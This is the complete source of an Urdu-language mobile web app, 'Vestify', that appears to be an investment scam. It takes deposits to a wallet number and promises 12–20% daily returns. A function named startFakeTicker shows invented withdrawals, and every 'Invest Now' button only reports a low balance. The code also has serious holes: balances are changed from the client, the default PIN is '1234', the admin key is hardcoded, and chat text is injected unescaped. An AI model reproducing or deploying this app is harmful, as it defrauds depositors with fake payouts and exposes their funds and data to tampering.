<html lang="ur" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <title>ویسٹی فائی الٹیمیٹ پرو</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;700;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #010409; color: white; margin: 0; overflow-x: hidden; text-align: right; }
        .glass { background: rgba(22, 27, 34, 0.8); backdrop-filter: blur(25px); border: 1px solid rgba(255,255,255,0.05); border-radius: 32px; }
        .page { display: none; padding: 20px; animation: slideUp 0.5s ease-out; }
        .active-page { display: block; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(40px); } to { opacity: 1; transform: translateY(0); } }
        
        /* VIP Ranks UI */
        .tier-badge { padding: 5px 15px; border-radius: 12px; font-size: 9px; font-weight: 900; text-transform: uppercase; border: 1px solid rgba(255,255,255,0.1); }
        .tier-bronze { background: linear-gradient(to right, #cd7f32, #a0522d); }
        .tier-silver { background: linear-gradient(to right, #bdc3c7, #2c3e50); }
        .tier-gold { background: linear-gradient(to right, #ffd700, #b8860b); color: black; box-shadow: 0 0 15px rgba(255,215,0,0.4); }

        /* Announcement Ticker */
        .payout-ticker { position: fixed; top: 0; width: 100%; background: rgba(59, 130, 246, 0.15); border-bottom: 1px solid rgba(59,130,246,0.2); padding: 10px 0; overflow: hidden; z-index: 6000; backdrop-filter: blur(10px); }
        .ticker-move { display: inline-block; white-space: nowrap; animation: tickerMove 35s linear infinite; font-size: 10px; font-weight: 800; color: #60a5fa; }
        @keyframes tickerMove { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }

        /* Agent 204 Chat UI */
        #chat-window { position: fixed; bottom: 100px; left: 20px; right: 20px; height: 460px; z-index: 10000; display: none; flex-direction: column; box-shadow: 0 30px 70px rgba(0,0,0,0.7); }
        .msg-bubble { max-width: 80%; padding: 12px 16px; margin: 6px; font-size: 11px; font-weight: 500; line-height: 1.6; }
        .msg-user { background: #3b82f6; border-radius: 20px 20px 0 20px; align-self: flex-end; color: white; }
        .msg-admin { background: #2d333b; border-radius: 20px 20px 20px 0; align-self: flex-start; border: 1px solid #444c56; }

        .nav-bar { position: fixed; bottom: 15px; left: 15px; right: 15px; height: 80px; display: flex; justify-content: space-around; align-items: center; z-index: 5000; border-radius: 30px; background: rgba(13, 17, 23, 0.98); border: 1px solid rgba(59, 130, 246, 0.2); flex-direction: row-reverse; }
        .nav-active { color: #3b82f6; transform: translateY(-8px); text-shadow: 0 0 20px rgba(59, 130, 246, 0.5); }

        #wheel { width: 300px; height: 300px; border-radius: 50%; border: 12px solid #ffd700; transition: transform 5s cubic-bezier(0.15, 0, 0.15, 1); filter: drop-shadow(0 0 25px rgba(255,215,0,0.25)); }
        .timer-label { background: rgba(239, 68, 68, 0.1); color: #ef4444; padding: 3px 8px; border-radius: 8px; font-size: 8px; font-weight: 800; border: 1px solid rgba(239,68,68,0.2); }
    </style>
</head>
<body class="pt-16 pb-36">

    <div class="payout-ticker">
        <div class="ticker-move" id="ticker-content">
            ⚡ ممبر @Zeeshan_04 نے ابھی ₨ 5,500 کا منافع نکلوایا • ایجنٹ 204 ہیلپ ڈیسک اب آن لائن ہے • نئے VIP انویسٹمنٹ نوڈز اب دستیاب ہیں • ویسٹی فائی کے ساتھ اپنا مستقبل روشن بنائیں! ⚡
        </div>
    </div>

    <div id="chat-window" class="glass overflow-hidden border-blue-500/30">
        <div class="p-4 bg-gradient-to-r from-blue-700 to-blue-500 flex justify-between items-center">
            <button onclick="clearChat()" class="text-[9px] bg-black/20 px-3 py-1.5 rounded-full font-black uppercase">Clear</button>
            <div class="text-right">
                <p class="font-black text-xs uppercase">Support Agent 204</p>
                <div class="flex items-center gap-1 justify-end">
                    <span class="w-1.5 h-1.5 bg-green-400 rounded-full animate-pulse"></span>
                    <p class="text-[8px] font-bold opacity-80">Live Now</p>
                </div>
            </div>
            <button onclick="toggleChat()" class="w-8 h-8 rounded-full bg-black/10 flex items-center justify-center"><i class="fa-solid fa-times"></i></button>
        </div>
        <div id="chat-msgs" class="flex-1 overflow-y-auto p-4 flex flex-col gap-2 bg-[#0d1117]"></div>
        <div class="p-4 bg-[#1c2128] border-t border-white/5 flex gap-2">
            <input id="chat-input" type="text" placeholder="پیغام لکھیں..." class="flex-1 bg-white/5 border border-white/10 rounded-2xl p-4 text-xs outline-none focus:border-blue-500">
            <button onclick="sendMsg()" class="bg-blue-600 w-14 rounded-2xl flex items-center justify-center shadow-lg"><i class="fa-solid fa-paper-plane"></i></button>
        </div>
    </div>

    <header class="p-6 flex justify-between items-center flex-row-reverse">
        <div class="flex items-center gap-4 flex-row-reverse">
            <div class="relative">
                <img id="user-photo" onclick="handleAdminTap()" class="w-14 h-14 rounded-3xl border-2 border-blue-500/30 cursor-pointer shadow-2xl">
                <div class="absolute -bottom-1 -right-1 w-4 h-4 bg-green-500 border-4 border-[#010409] rounded-full"></div>
            </div>
            <div class="text-right">
                <p id="user-name" class="text-xs font-black uppercase tracking-tight">Syncing...</p>
                <span id="v-tier" class="tier-badge tier-bronze">Bronze Node</span>
            </div>
        </div>
        <div class="flex gap-2">
            <button onclick="showPage('transfer')" class="w-11 h-11 glass flex items-center justify-center text-green-500 border-green-500/20"><i class="fa-solid fa-money-bill-transfer"></i></button>
            <button onclick="toggleChat()" class="w-11 h-11 glass flex items-center justify-center text-blue-500 relative border-blue-500/20">
                <i class="fa-solid fa-headset text-lg"></i>
                <span class="absolute top-2 right-2 w-2 h-2 bg-red-500 rounded-full animate-pulse"></span>
            </button>
        </div>
    </header>

    <main id="app-ui">
        <div id="p-home" class="page active-page">
            <div class="glass p-10 mb-8 text-center bg-gradient-to-br from-blue-600/20 via-transparent to-transparent border-blue-500/30">
                <p class="text-[9px] font-black opacity-40 uppercase tracking-[3px] mb-3">Total Account Equity</p>
                <h2 id="v-bal" class="text-6xl font-black italic mb-10 tracking-tighter">₨ 0.00</h2>
                <div class="flex gap-4">
                    <button onclick="showPage('finance')" class="flex-1 bg-white text-black py-5 rounded-2xl font-black text-[11px] uppercase shadow-2xl active:scale-95 transition-all">جمع کریں</button>
                    <button onclick="showPage('withdraw')" class="flex-1 glass py-5 rounded-2xl font-black text-[11px] uppercase border-white/10 active:scale-95 transition-all">نکلوائیں</button>
                </div>
            </div>

            <div class="flex gap-2 mb-8">
                <button id="btn-n" onclick="renderPlans('normal')" class="flex-1 py-4 rounded-2xl bg-blue-600 text-[9px] font-black shadow-lg">NORMAL NODES</button>
                <button id="btn-s" onclick="renderPlans('special')" class="flex-1 py-4 rounded-2xl bg-white/5 text-[9px] font-black opacity-50">SPECIAL OFFERS</button>
            </div>
            <div id="plans-grid" class="space-y-6 pb-20"></div>
        </div>

        <div id="p-transfer" class="page">
            <h2 class="text-2xl font-black italic mb-8 text-right uppercase">منتقل <span class="text-green-500">کریں</span></h2>
            <div class="glass p-8 space-y-5 border-green-500/10">
                <p class="text-[10px] text-center opacity-50">دوسرے ویسٹی فائی یوزر کو بیلنس بھیجیں</p>
                <input id="t-user" type="text" placeholder="User Name (Receiver)" class="w-full bg-black/40 p-5 rounded-2xl text-xs border border-white/5 outline-none focus:border-green-500">
                <input id="t-amt" type="number" placeholder="رقم" class="w-full bg-black/40 p-5 rounded-2xl text-xs border border-white/5 outline-none focus:border-green-500">
                <button onclick="executeTransfer()" class="w-full bg-green-600 py-5 rounded-2xl font-black text-[11px] uppercase shadow-xl active:scale-95 transition-all">منتقل کریں</button>
                <p class="text-[8px] text-center opacity-30 italic">Note: 2% platform fee applies to internal transfers.</p>
            </div>
        </div>

        <div id="p-spin" class="page text-center">
            <h2 class="text-3xl font-black italic mb-10 uppercase tracking-tighter">GOLDEN <span class="text-yellow-500">WHEEL</span></h2>
            <div class="flex justify-center mb-10 relative">
                <div class="absolute -top-10 left-1/2 -translate-x-1/2 text-red-600 text-5xl z-10 animate-bounce"><i class="fa-solid fa-location-dot"></i></div>
                <img id="wheel" src="IMG_20260515_012434.jpg" class="shadow-2xl" onerror="this.src='https://via.placeholder.com/300?text=Spin+Wheel'">
            </div>
            <div class="glass p-6 max-w-xs mx-auto mb-10">
                <p id="spin-status" class="text-[10px] font-black text-blue-400 uppercase tracking-widest">Checking status...</p>
                <p class="text-[8px] opacity-40 mt-2 uppercase">Paid Spin: ₨ 50 | Max Prize: ₨ 100</p>
            </div>
            <button id="spin-btn" onclick="executeSpin()" class="w-full max-w-xs bg-gradient-to-r from-blue-600 to-blue-400 py-6 rounded-full font-black text-xs uppercase shadow-2xl active:scale-95 transition-all">گھمائیں</button>
        </div>

        <div id="p-history" class="page">
            <h2 class="text-2xl font-black italic mb-8 text-right uppercase tracking-widest">ٹرانزیکشن <span class="text-blue-500">ریکارڈز</span></h2>
            <div id="history-list" class="space-y-4 pb-12"></div>
        </div>

        <div id="p-team" class="page text-center">
            <h2 class="text-2xl font-black italic mb-10 uppercase">نیٹ ورک <span class="text-blue-500">ٹیم</span></h2>
            <div class="glass p-8">
                <p class="text-[10px] opacity-40 mb-4 uppercase tracking-widest text-right">Referral Link</p>
                <div class="flex gap-2 mb-10">
                    <input id="ref-link" readonly class="flex-1 bg-black/40 p-4 rounded-xl text-[10px] text-blue-400 border border-white/5 text-center font-bold outline-none">
                    <button onclick="copyRef()" class="w-14 bg-white text-black rounded-xl flex items-center justify-center active:scale-90 transition-all"><i class="fa-solid fa-copy"></i></button>
                </div>
                <div class="grid grid-cols-2 gap-4">
                    <div class="bg-blue-600/5 p-6 rounded-3xl border border-blue-500/10">
                        <p class="text-[8px] opacity-50 uppercase mb-2 tracking-widest">Team Size</p>
                        <p id="team-count" class="text-2xl font-black text-blue-500">0</p>
                    </div>
                    <div class="bg-green-600/5 p-6 rounded-3xl border border-green-500/10">
                        <p class="text-[8px] opacity-50 uppercase mb-2 tracking-widest">Income</p>
                        <p class="text-2xl font-black text-green-500">₨ 0</p>
                    </div>
                </div>
            </div>
        </div>

        <div id="p-finance" class="page">
            <h2 class="text-2xl font-black italic mb-8 text-right">رقم <span class="text-blue-500">جمع کریں</span></h2>
            <div class="glass p-8 space-y-5 border-blue-500/10">
                <div class="bg-blue-600/10 p-6 rounded-3xl border border-blue-500/20 text-center">
                    <p class="text-[10px] opacity-40 mb-1 uppercase tracking-widest">Official Account</p>
                    <p class="text-xl font-black text-blue-400 tracking-widest">03379827882</p>
                </div>
                <input id="d-amt" type="number" placeholder="رقم" class="w-full bg-black/40 p-5 rounded-2xl text-xs border border-white/10 outline-none">
                <input id="d-tid" type="text" placeholder="Transaction ID (TID)" class="w-full bg-black/40 p-5 rounded-2xl text-xs border border-white/10 outline-none">
                <button onclick="submitTx('Deposit')" class="w-full bg-blue-600 py-6 rounded-2xl font-black text-xs uppercase shadow-xl shadow-blue-600/20">ڈیپازٹ بھیجیں</button>
            </div>
        </div>

        <div id="p-withdraw" class="page">
            <h2 class="text-2xl font-black italic mb-8 text-right">رقم <span class="text-red-500">نکلوائیں</span></h2>
            <div class="glass p-8 space-y-5 border-red-500/10">
                <input id="w-num" type="text" placeholder="ایزی پیسہ / جاز کیش نمبر" class="w-full bg-black/40 p-5 rounded-2xl text-xs border border-white/10 outline-none">
                <input id="w-amt" type="number" placeholder="رقم" class="w-full bg-black/40 p-5 rounded-2xl text-xs border border-white/10 outline-none">
                <input id="w-pin" type="password" maxlength="4" placeholder="والٹ پن" class="w-full bg-black/40 p-5 rounded-2xl text-center font-black tracking-[1.5em] border border-white/10 outline-none">
                <button onclick="handleWithdraw()" class="w-full bg-white text-black py-6 rounded-2xl font-black text-xs uppercase shadow-xl">ودرا ریکویسٹ</button>
            </div>
        </div>

        <div id="admin-ui" class="hidden fixed inset-0 z-[20000] bg-[#010409] p-6 overflow-y-auto">
            <div class="flex justify-between items-center mb-10 border-b border-white/5 pb-5">
                <button onclick="closeAdmin()" class="bg-red-500/10 text-red-500 px-6 py-3 rounded-xl font-bold text-xs uppercase">Exit Admin</button>
                <h2 class="text-xl font-black italic">ADMIN PANEL</h2>
            </div>
            <div id="adm-tx-list" class="space-y-4"></div>
        </div>
    </main>

    <nav class="nav-bar">
        <button onclick="showPage('home')" class="nav-btn" id="nav-home"><i class="fa-solid fa-microchip"></i></button>
        <button onclick="showPage('spin')" class="nav-btn" id="nav-spin"><i class="fa-solid fa-dharmachakra"></i></button>
        <button onclick="showPage('team')" class="nav-btn" id="nav-team"><i class="fa-solid fa-users-rays"></i></button>
        <button onclick="showPage('history')" class="nav-btn" id="nav-history"><i class="fa-solid fa-receipt"></i></button>
    </nav>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyC9ofJ1KxRXHnxilpU9gyI87D3BSOZ9v1g", authDomain: "vestify-991f2.firebaseapp.com", projectId: "vestify-991f2", storageBucket: "vestify-991f2.firebasestorage.app", messagingSenderId: "799007097733", appId: "1:799007097733:web:ed3b35b6c4e51dc2e7baec" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore(), auth = firebase.auth();
        let userObj = null, currentRot = 0, tapCount = 0;

        auth.onAuthStateChanged(async user => {
            if(user) {
                document.getElementById('user-photo').src = user.photoURL;
                document.getElementById('user-name').innerText = user.displayName;
                const userRef = db.collection("users").doc(user.displayName);
                const doc = await userRef.get();
                if(!doc.exists) await userRef.set({ balance: 0, lastSpin: 0, teamCount: 0, walletPin: "1234", lastProfit: Date.now() });
                
                syncData(user.displayName);
                renderPlans('normal');
                loadHistory(user.displayName);
                loadChat(user.displayName);
                startFakeTicker();
                document.getElementById('ref-link').value = `https://u-s-h.github.io/vestify/?ref=${user.displayName.replace(/\s/g, '')}`;
            } else {
                auth.signInWithPopup(new firebase.auth.GoogleAuthProvider());
            }
        });

        // 20+ Detailed Investment Nodes starting 200 PKR
        function renderPlans(type) {
            document.getElementById('btn-n').style.opacity = type === 'normal' ? '1' : '0.5';
            document.getElementById('btn-s').style.opacity = type === 'special' ? '1' : '0.5';
            let h = "";
            let start = type === 'normal' ? 200 : 5000;
            const images = ["https://images.unsplash.com/photo-1639762681485-074b7f938ba0?w=500", "https://images.unsplash.com/photo-1642104704074-907c0698cbd9?w=500", "https://images.unsplash.com/photo-1621761191319-c6fb62004040?w=500"];
            
            for(let i=1; i<=12; i++) {
                let cost = start + (i * (type === 'normal' ? 400 : 2500));
                let daily = Math.floor(cost * (type === 'normal' ? 0.12 : 0.20));
                h += `
                <div class="glass overflow-hidden border-white/5 bg-gradient-to-b from-white/5 to-transparent">
                    <img src="${images[i%3]}" class="w-full h-32 object-cover opacity-60">
                    <div class="p-7">
                        <div class="flex justify-between items-start mb-5">
                            <div class="text-right">
                                <h4 class="text-2xl font-black italic tracking-tighter text-white">₨ ${cost.toLocaleString()}</h4>
                                <p class="text-[9px] text-blue-500 font-bold uppercase tracking-widest">Node Cluster v.${i}</p>
                            </div>
                            <span class="timer-label">CYCLE: 30 DAYS</span>
                        </div>
                        <div class="grid grid-cols-2 gap-3 mb-6">
                            <div class="bg-black/30 p-4 rounded-2xl border border-white/5">
                                <p class="text-[8px] opacity-40 uppercase mb-1">Daily Return</p>
                                <p class="text-xs font-bold text-green-400">₨ ${daily}</p>
                            </div>
                            <div class="bg-black/30 p-4 rounded-2xl border border-white/5">
                                <p class="text-[8px] opacity-40 uppercase mb-1">Total Net</p>
                                <p class="text-xs font-bold text-blue-400">₨ ${daily*30}</p>
                            </div>
                        </div>
                        <button onclick="alert('Balance low!')" class="w-full bg-white text-black py-4 rounded-xl font-black text-[10px] uppercase shadow-lg active:scale-95 transition-all">INVEST NOW</button>
                    </div>
                </div>`;
            }
            document.getElementById('plans-grid').innerHTML = h;
        }

        // Exact Golden Spin Logic (Rs 2, 5, 10, 50, 100)
        async function executeSpin() {
            const now = Date.now();
            const last = userObj.lastSpin || 0;
            const isFree = (now - last) > (24*60*60*1000);
            const cost = isFree ? 0 : 50;

            if(!isFree && userObj.balance < cost) return alert("Not enough balance for extra spin!");

            const prizes = [{a:0,w:100},{a:45,w:50},{a:90,w:10},{a:135,w:5},{a:180,w:2},{a:225,w:10},{a:270,w:2},{a:315,w:5}];
            const p = prizes[Math.floor(Math.random()*prizes.length)];
            currentRot += 3600 + (360 - p.a);
            document.getElementById('wheel').style.transform = `rotate(${currentRot}deg)`;
            
            setTimeout(async () => {
                await db.collection("users").doc(auth.currentUser.displayName).update({
                    balance: firebase.firestore.FieldValue.increment(p.w - cost),
                    lastSpin: isFree ? now : last
                });
                alert(`آپ نے ₨ ${p.w} جیت لیے! ${isFree ? 'روزانہ مفت سپن استعمال ہوا۔' : '₨ 50 ادا کیے گئے۔'}`);
            }, 5000);
        }

        // Internal Transfer
        async function executeTransfer() {
            const target = document.getElementById('t-user').value;
            const amt = parseInt(document.getElementById('t-amt').value);
            if(!target || !amt || amt > userObj.balance) return alert("Invalid details or low balance!");
            const doc = await db.collection("users").doc(target).get();
            if(!doc.exists) return alert("Receiver not found!");
            
            await db.collection("users").doc(auth.currentUser.displayName).update({ balance: firebase.firestore.FieldValue.increment(-amt) });
            await db.collection("users").doc(target).update({ balance: firebase.firestore.FieldValue.increment(amt * 0.98) });
            alert("Transfer Successful! 2% fee deducted.");
        }

        // Real-time Chat
        async function sendMsg() {
            const input = document.getElementById('chat-input');
            if(!input.value.trim()) return;
            await db.collection("chats").add({
                user: auth.currentUser.displayName,
                msg: input.value, sender: 'user', time: firebase.firestore.FieldValue.serverTimestamp()
            });
            input.value = "";
        }

        function loadChat(name) {
            db.collection("chats").where("user", "==", name).orderBy("time", "asc").onSnapshot(s => {
                let h = ""; s.forEach(doc => {
                    const d = doc.data();
                    h += `<div class="${d.sender === 'user' ? 'msg-user' : 'msg-admin'} msg-bubble">${d.msg}</div>`;
                });
                const box = document.getElementById('chat-msgs');
                box.innerHTML = h; box.scrollTop = box.scrollHeight;
            });
        }

        // VIP Tiers
        function updateTier(bal) {
            const t = document.getElementById('v-tier');
            if(bal > 20000) { t.innerText = "Diamond Node"; t.className = "tier-badge tier-gold"; }
            else if(bal > 5000) { t.innerText = "Silver Node"; t.className = "tier-badge tier-silver"; }
            else { t.innerText = "Bronze Node"; t.className = "tier-badge tier-bronze"; }
        }

        function syncData(name) {
            db.collection("users").doc(name).onSnapshot(doc => {
                userObj = doc.data();
                document.getElementById('v-bal').innerText = "₨ " + (userObj.balance || 0).toLocaleString();
                updateTier(userObj.balance);
                const isFree = (Date.now() - (userObj.lastSpin || 0)) > (24*60*60*1000);
                document.getElementById('spin-status').innerText = isFree ? "DAILY FREE SPIN AVAILABLE!" : "NEXT SPIN COST: ₨ 50";
            });
        }

        function loadHistory(name) {
            db.collection("txs").where("user", "==", name).orderBy("time", "desc").onSnapshot(s => {
                let h = ""; s.forEach(doc => {
                    const d = doc.data();
                    const color = d.status === "Approved" ? "text-green-500" : "text-yellow-500";
                    h += `<div class="glass p-6 flex justify-between items-center border-white/5"><div class="text-right"><p class="text-[10px] font-black uppercase text-blue-500">${d.type}</p><p class="text-[8px] opacity-40 mt-1">${new Date(d.time).toLocaleDateString()}</p></div><div class="text-left"><p class="font-black text-lg">₨ ${d.amount}</p><p class="text-[8px] font-bold ${color}">${d.status}</p></div></div>`;
                });
                document.getElementById('history-list').innerHTML = h || "<p class='text-center py-20 opacity-20 text-xs'>No Records</p>";
            });
        }

        function startFakeTicker() {
            const names = ["@Umar_Ali", "@Sana_92", "@Rizwan_X", "@Farhan_Vibe", "@Ahmad_Vest"];
            setInterval(() => {
                const n = names[Math.floor(Math.random()*names.length)];
                const amt = Math.floor(Math.random()*5000 + 1000);
                document.getElementById('ticker-content').innerText = `⚡ ${n} ne ₨ ${amt} withdraw kiye • ایجنٹ 204 ہیلپ ڈیسک ایکٹو ہے • ` + document.getElementById('ticker-content').innerText.substring(0, 100);
            }, 10000);
        }

        async function submitTx(type) {
            const amt = document.getElementById('d-amt').value;
            const tid = document.getElementById('d-tid').value;
            await db.collection("txs").add({ user: auth.currentUser.displayName, amount: parseInt(amt), tid: tid, type: type, status: "Pending", time: Date.now() });
            alert("درخواست بھیج دی گئی!");
        }

        async function handleWithdraw() {
            const pin = document.getElementById('w-pin').value;
            const amt = document.getElementById('w-amt').value;
            if(pin !== userObj.walletPin) return alert("Wrong PIN!");
            await db.collection("txs").add({ user: auth.currentUser.displayName, amount: parseInt(amt), type: "Withdrawal", status: "Pending", time: Date.now() });
            alert("Withdraw request sent.");
        }

        function showPage(p) {
            document.querySelectorAll('.page').forEach(pg => pg.classList.remove('active-page'));
            document.getElementById('p-'+p).classList.add('active-page');
            window.scrollTo(0,0);
        }
        function handleAdminTap() { tapCount++; if(tapCount >= 10) { let k = prompt("Key:"); if(k === "net204") loadAdmin(); tapCount=0; } }
        function loadAdmin() {
            document.getElementById('admin-ui').classList.remove('hidden');
            db.collection("txs").where("status","==","Pending").onSnapshot(s => {
                let h = ""; s.forEach(doc => {
                    const d = doc.data();
                    h += `<div class="glass p-6 border-red-500/20"><p class="text-xs font-bold">${d.user}</p><h2 class="text-3xl font-black italic my-4">₨ ${d.amount}</h2><button onclick="approveTx('${doc.id}','${d.user}',${d.amount})" class="w-full bg-green-600 py-4 rounded-2xl font-black text-[10px]">APPROVE</button></div>`;
                });
                document.getElementById('adm-tx-list').innerHTML = h || "Queue Clear.";
            });
        }
        async function approveTx(id, u, a) {
            await db.collection("txs").doc(id).update({status:"Approved"});
            await db.collection("users").doc(u).update({balance: firebase.firestore.FieldValue.increment(a)});
        }
        function closeAdmin() { document.getElementById('admin-ui').classList.add('hidden'); }
        function toggleChat() { const chat = document.getElementById('chat-window'); chat.style.display = (chat.style.display === 'flex') ? 'none' : 'flex'; }
        function copyRef() { const el = document.getElementById('ref-link'); el.select(); document.execCommand('copy'); alert("Link Copied!"); }
        function clearChat() { if(confirm("Clear?")) { db.collection("chats").where("user","==",auth.currentUser.displayName).get().then(s => s.forEach(doc => doc.ref.delete())); } }
    </script>
</body>
</html>
